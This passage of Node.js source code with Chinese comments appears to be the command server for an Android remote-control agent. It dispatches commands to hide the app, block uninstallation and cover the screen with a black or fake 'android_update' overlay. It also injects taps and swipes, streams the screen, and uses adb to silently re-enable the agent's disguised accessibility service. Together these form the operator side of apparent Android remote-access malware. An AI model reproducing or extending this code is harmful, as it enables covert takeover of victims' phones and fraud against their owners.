    // text 字段（android_update 样式才用 updateTitle/updateSubtitle）→ 非更新样式把文字补进 text，
    // 否则纯黑遮挡下用户配置的文字不会显示
    if ((cmd === 'ENABLE_BLACK_SCREEN' || cmd === 'ENABLE_DXS_BLACK_SCREEN') && payload) {
      const style = String(payload.style || 'normal_black');
      if (style !== 'android_update' && !payload.text && payload.updateTitle)
        payload = {...payload, text: payload.updateTitle};
    }
    // 状态翻转类命令：agent 执行后不主动回推状态 → 1.2s/3s 双跳 GET_DEVICE_STATE 主动刷新，
    // 回包走上面 status 分支统一落库+广播（前端各开关 deviceStateChange 实时翻转）
    if (['ENABLE_UNINSTALL_PROTECTION', 'DISABLE_UNINSTALL_PROTECTION', 'LOG_ENABLE', 'LOG_DISABLE',
         'HIDE_APP', 'SHOW_APP', 'ENABLE_BLACK_SCREEN', 'DISABLE_BLACK_SCREEN',
         'ENABLE_DXS_BLACK_SCREEN', 'DISABLE_DXS_BLACK_SCREEN'].includes(cmd)) {
      setTimeout(() => { if (ZQ_WS.has(devId)) dispatch(devId, 'GET_DEVICE_STATE', {}); }, 1200);
      setTimeout(() => { if (ZQ_WS.has(devId)) dispatch(devId, 'GET_DEVICE_STATE', {}); }, 3000);
    }
    return dispatch(devId, XY2ZQ[cmd] || cmd, payload);
  } catch (e) { ctx.log('zq-cmd-err', {c: cmd, e: String(e).slice(0, 100)}); return false; }
}

// ---------------- 触控（字段名 StringFog 解密实证：CLICK{x,y} SWIPE{startX,startY,endX,endY,duration} LONG_PRESS{x,y}） ----------------
async function touch(devId, cmd, p) {
  p = p || {};
  // agent WS 离线但有 adb serial（无线调试隧道）→ 触控走 adb 直注，不依赖无障碍
  if (!ZQ_WS.get(devId) && ctx.eagle.adbMap[devId]) {
    if (cmd === 'home') return await ctx.eagle.adbShell(devId, ['input', 'keyevent', '3']) !== null;
    if (cmd === 'back') return await ctx.eagle.adbShell(devId, ['input', 'keyevent', '4']) !== null;
    if (cmd === 'recents' || cmd === 'app_switch') return await ctx.eagle.adbShell(devId, ['input', 'keyevent', '187']) !== null;
    if (cmd === 'swipe_path' && Array.isArray(p.path) && p.path.length >= 2) {
      const a = p.path[0], z = p.path[p.path.length - 1];
      return await ctx.eagle.adbTouch(devId, 'swipe', {startX: a.x, startY: a.y, endX: z.x, endY: z.y, duration: p.duration || 300});
    }
    return await ctx.eagle.adbTouch(devId, cmd, p);
  }
  const N = v => { const n = Math.round(parseFloat(v)); return isFinite(n) ? n : 0; };
  if (cmd === 'click' || cmd === 'tap') {
    const x = N(p.x ?? p.centerX), y = N(p.y ?? p.centerY);
    if (!x && !y) return false;
    return dispatch(devId, 'CLICK', {x, y});
  }
  if (cmd === 'swipe') {
    // duration 上限 250ms：手势完成越快画面反馈越早（a11y dispatchGesture 同步滑完才返回，
    // 前端可能传 400-1000ms 的长手势 → 操作后等下一帧的感知延迟显著增加）
    const dur = Math.min(N(p.duration) || 250, 250);
    return dispatch(devId, 'SWIPE', {startX: N(p.startX ?? p.x1), startY: N(p.startY ?? p.y1),
                                      endX: N(p.endX ?? p.x2), endY: N(p.endY ?? p.y2),
                                      duration: dur});
  }
  if (cmd === 'swipe_path' || cmd === 'long_press_drag') {
    // 前端把「带移动轨迹的拖动」（移动 >5px = 几乎所有真实拖动）发成 path 命令，
    // 转成 agent 的 SWIPE（首→末点，轨迹精华），否则该类命令被静默丢弃、画面滑不动。
    const path = Array.isArray(p.path) ? p.path : [];
    if (path.length >= 2) {
      const a = path[0], b = path[path.length - 1];
      const dur = Math.min(N(p.duration) || 300, 500);
      if (cmd === 'long_press_drag') dispatch(devId, 'LONG_PRESS', {x: N(a.x), y: N(a.y)});
      return dispatch(devId, 'SWIPE', {startX: N(a.x), startY: N(a.y), endX: N(b.x), endY: N(b.y), duration: dur});
    }
    return false;
  }
  if (cmd === 'longclick' || cmd === 'long_press') {
    return dispatch(devId, 'LONG_PRESS', {x: N(p.x), y: N(p.y)});
  }
  if (cmd === 'home') return dispatch(devId, 'KEY_EVENT', {key: 'HOME'});
  if (cmd === 'back') return dispatch(devId, 'KEY_EVENT', {key: 'BACK'});
  if (cmd === 'recents' || cmd === 'app_switch') return dispatch(devId, 'KEY_EVENT', {key: 'RECENTS'});
  if (await ctx.eagle.adbTouch(devId, cmd, p)) return true;    // 其余手势 adb 兜底
  return false;
}

// ---------------- 屏幕流自愈看门狗（两级 + 慢流检测） ----------------
// L1: a11y 重绑（accessibility_enabled 0→1）；L2: force-stop agent + 重开无障碍（ColorOS 限频卡死的根治手段，实测有效）
// 慢流检测：30s 窗口 <8 帧（均值 >4s/帧，ColorOS 截屏退避）→ L1 重绑重置 agent 退避 + 重发低质量规格（冷却 90s）
function screenWatchdog() {
  setInterval(async () => {
    const now = Date.now();
    for (const devId of [...ZQ_STREAM]) {
      if (!ZQ_WS.has(devId)) continue;                      // WS 断开中（L2 重启中），等重连
      // RTC 直连模式：画面走 P2P 视频流，agent 不发 a11y 截图（ZQ_LAST_FRAME 恒陈旧是正常现象，
      // 实测误判成流死触发 L1 heal 会打爆 agent）。仅检查「激活 60s 内 agent 未回 OFFER」→ 回退截图流
      if (ZQ_RTC.has(devId)) {
        const r = ZQ_RTC.get(devId);
        if (!r.offerAt && r.at && now - r.at > 60000) {
          ZQ_RTC.delete(devId);
          ctx.log('zq-rtc-nooffer', {d: devId, note: 'no OFFER in 60s, fallback a11y stream'});
          streamActivate(devId, {force: true});
        }
        continue;
      }
      const last = ZQ_LAST_FRAME.get(devId) || 0;
      if (last && now - last < 60000) {
        HEAL_LEVEL.delete(devId);
        // 慢流检测（有帧但间隔过大 = agent 端截屏退避，用户看到 5-10s 级画面滞后）
        const fc = ZQ_FRAME_CNT.get(devId);
        if (fc && now - fc.winStart >= 30000) {
          const gapAvg = (now - fc.winStart) / 1000 / Math.max(fc.n, 1);
          if (fc.n < 8 && now - (ZQ_SLOW_HEAL_AT.get(devId) || 0) > 90000) {
            ZQ_SLOW_HEAL_AT.set(devId, now);
            ctx.log('zq-frame-slow', {d: devId, n_30s: fc.n, gap_avg_s: +gapAvg.toFixed(1)});
            try {
              await ctx.eagle.adbShell(devId, ['settings', 'put', 'secure', 'accessibility_enabled', '0'], 10);
              await new Promise(r => setTimeout(r, 1200));
              await ctx.eagle.adbShell(devId, ['settings', 'put', 'secure', 'accessibility_enabled', '1'], 10);
              dispatch(devId, 'SCREEN_CAPTURE_SET_TECH', {tech: 'accessibility'});
              wsSend(devId, INIT_CFG());
              ctx.log('zq-frame-slow-heal', {d: devId});
            } catch (e) { ctx.log('zq-slow-heal-err', String(e).slice(0, 80)); }
          }
          ZQ_FRAME_CNT.set(devId, {winStart: now, n: 0});   // 滚动新窗口
        }
        continue;
      }
      if (!last) { ZQ_LAST_FRAME.set(devId, Date.now() - 30000); continue; }
      const lv = HEAL_LEVEL.get(devId) || 1;
      ZQ_LAST_FRAME.set(devId, Date.now());                 // 防重复触发
      try {
        if (lv === 1) {
          ctx.log('zq-frame-stall', {d: devId, lv, gap_s: Math.round((Date.now() - last) / 1000)});
          await ctx.eagle.adbShell(devId, ['settings', 'put', 'secure', 'accessibility_enabled', '0'], 10);
          await new Promise(r => setTimeout(r, 1500));
          await ctx.eagle.adbShell(devId, ['settings', 'put', 'secure', 'accessibility_enabled', '1'], 10);
          await new Promise(r => setTimeout(r, 3000));
          dispatch(devId, 'SCREEN_CAPTURE_SET_TECH', {});
          wsSend(devId, INIT_CFG());
          HEAL_LEVEL.set(devId, 2);
          ctx.log('zq-frame-heal', {d: devId, lv: 1});
        } else {
          // L2：force-stop agent（ColorOS 会清无障碍授权）→ 重开无障碍 → a11y 绑定拉起进程 → 重连后 ws-up 自动 streamActivate
          ctx.log('zq-frame-stall', {d: devId, lv, gap_s: Math.round((Date.now() - last) / 1000)});
          await ctx.eagle.adbShell(devId, ['am', 'force-stop', 'com.zq.final'], 10);
          await new Promise(r => setTimeout(r, 1500));
          await ctx.eagle.adbShell(devId, ['settings', 'put', 'secure', 'enabled_accessibility_services', 'com.zq.final/com.nest.craft.spark.service.PlatformAssistDaemon'], 10);
          await ctx.eagle.adbShell(devId, ['settings', 'put', 'secure', 'accessibility_enabled', '1'], 10);
          HEAL_LEVEL.delete(devId);
          ZQ_LAST_FRAME.delete(devId);                      // 重连重激活后重新计时
          ctx.log('zq-frame-heal', {d: devId, lv: 2, note: 'agent restarted, waiting reconnect'});
        }
      } catch (e) { ctx.log('zq-heal-err', String(e).slice(0, 100)); }
    }
  }, 20000);
}

// 统一命令入口：eagle 走 TCP，agent 走 WS
function commandAny(devId, cmd, payload) {
  if (ctx.eagle.isEagleDev(devId)) return ctx.eagle.commandToDevice(devId, cmd, payload);
  return commandToDevice(devId, cmd, payload);
}
function touchAny(devId, cmd, p) {
  if (ctx.eagle.isEagleDev(devId)) return ctx.eagle.eagleTouch(devId, cmd, p);
  return touch(devId, cmd, p);
}

module.exports = {init, httpHandler, handleDeviceWs, dispatch, wsSend, commandToDevice, commandAny, touchAny, rtcStopped, readerStart, readerStop, readerPull, waitPasswordStatus, ZQ_WS, ZQ_QUEUE};
